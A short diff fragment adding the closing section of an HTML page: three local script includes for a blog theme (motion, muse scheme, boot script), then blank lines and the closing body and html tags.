+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
